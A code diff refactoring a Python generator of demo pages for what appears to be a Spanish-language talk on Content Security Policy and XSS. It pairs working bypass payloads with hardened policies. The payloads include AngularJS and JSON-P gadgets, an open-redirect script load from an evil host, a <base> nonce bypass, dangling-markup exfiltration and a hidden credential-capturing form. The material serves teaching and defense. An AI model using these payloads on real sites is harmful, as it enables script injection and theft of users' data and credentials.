@@ -1,43 +1,58 @@
 from pathlib import Path
 from jinja2 import Environment, FileSystemLoader
+from dataclasses import dataclass
 from textwrap import dedent
 
 BASE_PATH = Path(__file__).parent.absolute()
 
 
-def get_examples():
+@dataclass
+class Example:
+    title: str
+    csp: str
+    vulnerable: bool
+    payload: str
+    nonce: str | None = None
+    raw: bool = False
+    page: str = ""
+
+    def replace(self, **kwargs):
+        new_kwargs = {**self.__dict__, **kwargs}
+        return Example(**new_kwargs)
+
+
+def get_examples() -> list[Example]:
     examples = []
     csp = "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;"
     examples.append(
-        {
-            "title": "CSP bypass usando inline JS",
-            "csp": csp,
-            "vulnerable": True,
-            "payload": dedent(
+        Example(
+            title="CSP bypass usando inline JS",
+            csp=csp,
+            vulnerable=True,
+            payload=dedent(
                 """
                 <script>
                   alert(document.domain)
                 </script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     csp = csp.replace("'unsafe-inline' ", "")
     examples.append(
-        {
-            **examples[-1],
-            "vulnerable": False,
-            "csp": csp,
-        }
+        examples[-1].replace(
+            vulnerable=False,
+            csp=csp,
+        )
     )
 
     examples.append(
-        {
-            "title": "CSP bypass usando AngularJS",
-            "csp": csp,
-            "vulnerable": True,
-            "payload": dedent(
+        Example(
+            title="CSP bypass usando AngularJS",
+            csp=csp,
+            vulnerable=True,
+            payload=dedent(
                 """
                 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
 
@@ -46,7 +61,7 @@ def get_examples():
                 </div>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     csp = csp.replace("'unsafe-eval' ", "").replace(
@@ -54,60 +69,58 @@ def get_examples():
         "https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js",
     )
     examples.append(
-        {
-            **examples[-1],
-            "vulnerable": False,
-            "csp": csp,
-        }
+        examples[-1].replace(
+            vulnerable=False,
+            csp=csp,
+        )
     )
 
     examples.append(
-        {
-            "title": "CSP bypass usando JSON-P",
-            "csp": csp,
-            "vulnerable": True,
-            "payload": dedent(
+        Example(
+            title="CSP bypass usando JSON-P",
+            csp=csp,
+            vulnerable=True,
+            payload=dedent(
                 """
                 <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     csp = csp.replace("https://*.google.com", "https://www.google.com/recaptcha/")
     csp = csp.replace("https://*.gstatic.com", "https://www.gstatic.com/recaptcha/")
     examples.append(
-        {
-            **examples[-1],
-            "vulnerable": False,
-            "csp": csp,
-        }
+        examples[-1].replace(
+            vulnerable=False,
+            csp=csp,
+        )
     )
 
     examples.append(
-        {
-            "title": "CSP bypass usando un open redirect",
-            "csp": csp,
-            "vulnerable": False,
-            "payload": dedent(
+        Example(
+            title="CSP bypass usando un open redirect",
+            csp=csp,
+            vulnerable=False,
+            payload=dedent(
                 """
                 <script src="/_/redirect/?https://evil.example.com/path/to/evil.js"></script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     examples.append(
-        {
-            "title": "CSP bypass usando un open redirect",
-            "csp": csp,
-            "vulnerable": True,
-            "payload": dedent(
+        Example(
+            title="CSP bypass usando un open redirect",
+            csp=csp,
+            vulnerable=True,
+            payload=dedent(
                 """
                 <script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     csp = csp.replace(
@@ -116,19 +129,18 @@ def get_examples():
     )
 
     examples.append(
-        {
-            **examples[-1],
-            "vulnerable": False,
-            "csp": csp,
-        }
+        examples[-1].replace(
+            vulnerable=False,
+            csp=csp,
+        )
     )
 
     examples.append(
-        {
-            "title": "CSP bypass ¡AngularJS está de vuelta!",
-            "csp": csp,
-            "vulnerable": True,
-            "payload": dedent(
+        Example(
+            title="CSP bypass ¡AngularJS está de vuelta!",
+            csp=csp,
+            vulnerable=True,
+            payload=dedent(
                 """
                 <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
 
@@ -137,7 +149,7 @@ def get_examples():
                 </div>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     nonce = "8IBTHwOdqNKAWeKl7plt8g=="
@@ -145,12 +157,12 @@ def get_examples():
     csp = f"script-src 'nonce-{nonce}' 'sha256-{sha256}';"
 
     examples.append(
-        {
-            "title": "CSP usando un nonce y hash",
-            "csp": csp,
-            "vulnerable": False,
-            "nonce": nonce,
-            "payload": dedent(
+        Example(
+            title="CSP usando un nonce y hash",
+            csp=csp,
+            vulnerable=False,
+            nonce=nonce,
+            payload=dedent(
                 f"""
                 <script nonce="{nonce}">
                   alert("Este script si está permitido")
@@ -159,13 +171,12 @@ def get_examples():
                 <script>alert("Inline script correspondiente al hash!")</script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     examples.append(
-        {
-            **examples[-1],
-            "payload": dedent(
+        examples[-1].replace(
+            payload=dedent(
                 f"""
                 <script nonce="abc1234">
                   alert("Este script si está permitido")
@@ -174,16 +185,16 @@ def get_examples():
                 <script>alert("Inline script correspondiente al hash!");</script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     examples.append(
-        {
-            "title": "Nonce bypass usando <base>",
-            "csp": csp,
-            "vulnerable": True,
-            "nonce": nonce,
-            "payload": dedent(
+        Example(
+            title="Nonce bypass usando <base>",
+            csp=csp,
+            vulnerable=True,
+            nonce=nonce,
+            payload=dedent(
                 f"""
                 <!-- Payload malicioso -->
                 <base href="https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/">
@@ -192,55 +203,54 @@ def get_examples():
                 <script nonce="{nonce}" src="js/test.js"></script>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     csp += "base-uri 'none';"
 
     examples.append(
-        {
-            **examples[-1],
-            "vulnerable": False,
-            "csp": csp,
-        }
+        examples[-1].replace(
+            csp=csp,
+            vulnerable=False,
+        )
     )
 
     examples.append(
-        {
-            "title": "Redireccionamiento a otro sitio",
-            "csp": csp,
-            "vulnerable": True,
-            "nonce": nonce,
-            "payload": dedent(
+        Example(
+            title="Redireccionamiento a otro sitio",
+            csp=csp,
+            vulnerable=True,
+            nonce=nonce,
+            payload=dedent(
                 f"""
                 <meta http-equiv="refresh" content="0; url=https://example.com/" />
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     examples.append(
-        {
-            "title": "Exfiltración de URL",
-            "csp": csp,
-            "vulnerable": True,
-            "nonce": nonce,
-            "payload": dedent(
+        Example(
+            title="Exfiltración de URL",
+            csp=csp,
+            vulnerable=True,
+            nonce=nonce,
+            payload=dedent(
                 """
                 <img src="https://example.com/" referrerpolicy="unsafe-url" />
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     examples.append(
-        {
-            "title": "Exfiltración de contenido",
-            "csp": csp,
-            "vulnerable": False,
-            "nonce": nonce,
-            "raw": True,
-            "payload": dedent(
+        Example(
+            title="Exfiltración de contenido",
+            csp=csp,
+            vulnerable=False,
+            nonce=nonce,
+            raw=True,
+            payload=dedent(
                 f"""
                 <p>Secretos</p>
                 <form>
@@ -251,29 +261,28 @@ def get_examples():
                 <p class='red'>Más secretos</p>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     examples.append(
-        {
-            **examples[-1],
-            "vulnerable": True,
-            "payload": dedent(
+        examples[-1].replace(
+            vulnerable=True,
+            payload=dedent(
                 """
                 <img src='https://example.com/?
                 """
             ).strip("\n")
-            + examples[-1]["payload"],
-        }
+            + examples[-1].payload,
+        )
     )
 
     examples.append(
-        {
-            "title": "Exfiltración de credenciales",
-            "csp": csp,
-            "vulnerable": True,
-            "nonce": nonce,
-            "payload": dedent(
+        Example(
+            title="Exfiltración de credenciales",
+            csp=csp,
+            vulnerable=True,
+            nonce=nonce,
+            payload=dedent(
                 """
                 <form action="https://example.com/">
                   <input name="email" style="opacity:0;width:0">
@@ -282,7 +291,7 @@ def get_examples():
                 </form>
                 """
             ).strip("\n"),
-        }
+        )
     )
 
     return examples
@@ -305,7 +314,7 @@ def main():
         section_id = f"{i+1:02d}"
         current_example = f"{section_id}.html"
         # Inject page info into each example.
-        example["page"] = current_example
+        example.page = current_example
         prev_example = None
         next_example = None
         if i > 0:
@@ -318,10 +327,10 @@ def main():
             "current_example": current_example,
             "prev_example": prev_example,
             "next_example": next_example,
-            **example,
+            **example.__dict__,
         }
 
-        if example.get("raw"):
+        if example.raw:
             template = example_raw_template
         else:
             template = example_template
